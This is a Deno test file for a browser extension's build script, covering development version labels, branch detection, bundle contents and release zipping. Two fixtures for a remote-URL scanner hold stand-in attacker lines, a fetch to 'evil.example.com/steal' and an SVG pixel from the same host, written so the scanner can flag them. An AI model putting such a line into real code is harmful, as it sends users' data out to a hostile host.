import { assert, assertEquals, assertFalse, assertRejects, assertThrows } from "@std/assert";
import { toFileUrl } from "@std/path";
import { chromium } from "playwright";
import {
  build,
  collectRemoteUrlOffenders,
  currentDevelopmentBranch,
  developmentVersionName,
  esbuildTargetFrom,
} from "./build.ts";
import { manifestBase, SUPPORTED } from "./manifest.ts";

const TEST_BRANCH = "feat/a2a-portable-client-proof-fixture";
const A2A_CLIENT_BUNDLE_PATH = "shared/a2a/client.js";
const FORBIDDEN_A2A_CLIENT_REFERENCES = [
  "Buffer",
  "node:",
  "@a2a-js/sdk",
  "@grpc/grpc-js",
  "@bufbuild/protobuf",
  "chrome.",
  "browser.",
] as const;

function forbiddenA2AClientReferences(bundle: string): string[] {
  return FORBIDDEN_A2A_CLIENT_REFERENCES.filter((reference) => bundle.includes(reference));
}

/**
 * Every `build()` call here writes to a fresh temp directory, never the repo's `dist/`. `deno task
 * ci` is the lefthook pre-push hook, so a test that wipes the default output would delete the
 * developer's built extension on every push — and the documented `deno task build && deno task
 * e2e:smoke` flow needs that tree to still be there.
 */
async function withTempOutDir(run: (outDir: URL) => Promise<void>): Promise<void> {
  const tempDir = await Deno.makeTempDir();
  try {
    await run(new URL(`${toFileUrl(tempDir).href}/`));
  } finally {
    await Deno.remove(tempDir, { recursive: true });
  }
}

Deno.test("esbuildTargetFrom - derives esbuild target strings from SUPPORTED, not literals", () => {
  assertEquals(esbuildTargetFrom(SUPPORTED), ["chrome116", "firefox109"]);
});

Deno.test("developmentVersionName - preserves a slash-delimited branch in the local label", () => {
  assertEquals(
    developmentVersionName("2026.801.0", TEST_BRANCH),
    "2026.801.0-dev-feat/a2a-portable-client-proof-fixture",
  );
});

Deno.test("developmentVersionName - rejects a missing branch", () => {
  assertThrows(
    () => developmentVersionName("2026.801.0", ""),
    Error,
    "build: cannot label a development build without a git branch",
  );
});

Deno.test("currentDevelopmentBranch - prefers the GitHub PR head without reading git", async () => {
  let readGit = false;
  const branch = await currentDevelopmentBranch(
    { get: (name) => name === "GITHUB_HEAD_REF" ? TEST_BRANCH : undefined },
    () => {
      readGit = true;
      return Promise.resolve("wrong-branch");
    },
  );

  assertEquals(branch, TEST_BRANCH);
  assertFalse(readGit);
});

Deno.test("currentDevelopmentBranch - uses the workflow ref when the PR head is empty", async () => {
  const branch = await currentDevelopmentBranch(
    { get: (name) => name === "GITHUB_HEAD_REF" ? "" : TEST_BRANCH },
    () => Promise.resolve("wrong-branch"),
  );

  assertEquals(branch, TEST_BRANCH);
});

Deno.test("currentDevelopmentBranch - falls back to git outside GitHub Actions", async () => {
  const branch = await currentDevelopmentBranch(
    { get: () => undefined },
    () => Promise.resolve(TEST_BRANCH),
  );

  assertEquals(branch, TEST_BRANCH);
});

Deno.test("currentDevelopmentBranch - rejects a detached local checkout", async () => {
  await assertRejects(
    () => currentDevelopmentBranch({ get: () => undefined }, () => Promise.resolve("HEAD")),
    Error,
    "build: cannot label a development build from a detached HEAD",
  );
});

Deno.test("collectRemoteUrlOffenders - flags an injected http(s) literal, ignores a clean file", async () => {
  const tempDir = await Deno.makeTempDir();
  try {
    const dir = new URL(`${toFileUrl(tempDir).href}/`);
    await Deno.writeTextFile(new URL("clean.js", dir), "console.log('ok');");
    await Deno.writeTextFile(
      new URL("dirty.js", dir),
      "fetch('https://evil.example.com/steal');",
    );
    const offenders = await collectRemoteUrlOffenders(dir);
    assertEquals(offenders.length, 1);
    assert(offenders[0]?.endsWith("dirty.js"));
  } finally {
    await Deno.remove(tempDir, { recursive: true });
  }
});

Deno.test("collectRemoteUrlOffenders - scans .svg, and a namespace declaration alone is not an offence", async () => {
  const tempDir = await Deno.makeTempDir();
  try {
    const dir = new URL(`${toFileUrl(tempDir).href}/`);
    // Shaped like the real sprite: the namespace attribute is the only http literal, so a guard
    // that scanned .svg without sanitizing namespaces would fail every build on this file.
    await Deno.writeTextFile(
      new URL("sprite.svg", dir),
      '<svg xmlns="http://www.w3.org/2000/svg"><symbol id="a"><path d="M0 0h1v1H0z"/></symbol></svg>',
    );
    await Deno.writeTextFile(
      new URL("remote.svg", dir),
      '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example.com/pixel.png"/></svg>',
    );
    const offenders = await collectRemoteUrlOffenders(dir);
    assertEquals(offenders.length, 1);
    assert(offenders[0]?.endsWith("remote.svg"));
  } finally {
    await Deno.remove(tempDir, { recursive: true });
  }
});

Deno.test("build({ release: false }) - emits dist/<target>/manifest.json plus bundles for both targets", async () => {
  await withTempOutDir(async (outDir) => {
    await build({ release: false, branch: TEST_BRANCH, outDir });
    for (const target of ["chrome", "firefox"] as const) {
      const targetDir = new URL(`${target}/`, outDir);
      const manifest = JSON.parse(await Deno.readTextFile(new URL("manifest.json", targetDir)));
      assertEquals(manifest.manifest_version, 3);
      assertEquals(
        manifest.version_name,
        developmentVersionName(manifestBase.version, TEST_BRANCH),
      );
      await Deno.stat(new URL("background/background.js", targetDir));
      await Deno.stat(new URL("content/content.js", targetDir));
      await Deno.stat(new URL("sidepanel/sidepanel.js", targetDir));
      await Deno.stat(new URL("sidepanel/sidepanel.html", targetDir));
      await Deno.stat(new URL("popup/popup.js", targetDir));
      await Deno.stat(new URL("popup/popup.html", targetDir));
      await Deno.stat(new URL("options/options.js", targetDir));
      await Deno.stat(new URL("options/options.html", targetDir));
      await Deno.stat(new URL("icons/icon-16.png", targetDir));
      await Deno.stat(new URL("src/shared/design/tokens.css", targetDir));
      await Deno.stat(new URL("src/shared/design/icons.svg", targetDir));
      const a2aClientBundle = await Deno.readTextFile(
        new URL(A2A_CLIENT_BUNDLE_PATH, targetDir),
      );
      assertEquals(forbiddenA2AClientReferences(a2aClientBundle), []);
      const bg = await Deno.readTextFile(new URL("background/background.js", targetDir));
      assert(bg.includes("sourceMappingURL"));
    }
  });
});

Deno.test("build({ release: true }) - minifies, drops sourcemaps, and zips both targets", async () => {
  await withTempOutDir(async (outDir) => {
    await build({ release: true, outDir });
    const chromeDir = new URL("chrome/", outDir);
    const firefoxDir = new URL("firefox/", outDir);
    const chromeA2AClientBundle = await Deno.stat(new URL(A2A_CLIENT_BUNDLE_PATH, chromeDir));
    const firefoxA2AClientBundle = await Deno.stat(new URL(A2A_CLIENT_BUNDLE_PATH, firefoxDir));
    const minifiedA2AClientBundle = await Deno.readTextFile(
      new URL(A2A_CLIENT_BUNDLE_PATH, chromeDir),
    );
    assert(chromeA2AClientBundle.size > 0);
    assertEquals(firefoxA2AClientBundle.size, chromeA2AClientBundle.size);
    assertEquals(forbiddenA2AClientReferences(minifiedA2AClientBundle), []);
    const browser = await chromium.launch({ headless: true });
    try {
      const page = await browser.newPage();
      const exportedSymbols = await page.evaluate(async (bundle) => {
        const moduleUrl = URL.createObjectURL(new Blob([bundle], { type: "text/javascript" }));
        try {
          return Object.keys(await import(moduleUrl));
        } finally {
          URL.revokeObjectURL(moduleUrl);
        }
      }, minifiedA2AClientBundle);
      assert(exportedSymbols.includes("createA2AClientFactory"));
      assert(exportedSymbols.includes("A2AClientError"));
    } finally {
      await browser.close();
    }
    console.log(
      `build: portable A2A client minified bundle delta ${chromeA2AClientBundle.size} bytes`,
    );
    const bg = await Deno.readTextFile(new URL("background/background.js", chromeDir));
    assert(!bg.includes("sourceMappingURL"));
    for (const targetDir of [chromeDir, firefoxDir]) {
      const manifest = JSON.parse(await Deno.readTextFile(new URL("manifest.json", targetDir)));
      assertFalse("version_name" in manifest);
    }

    let mapExists = true;
    try {
      await Deno.stat(new URL("background/background.js.map", chromeDir));
    } catch (error) {
      if (!(error instanceof Deno.errors.NotFound)) throw error;
      mapExists = false;
    }
    assert(!mapExists);

    const chromeZip = await Deno.stat(new URL("chrome.zip", outDir));
    const firefoxZip = await Deno.stat(new URL("firefox.zip", outDir));
    assert(chromeZip.size > 0);
    assert(firefoxZip.size > 0);
  });
});
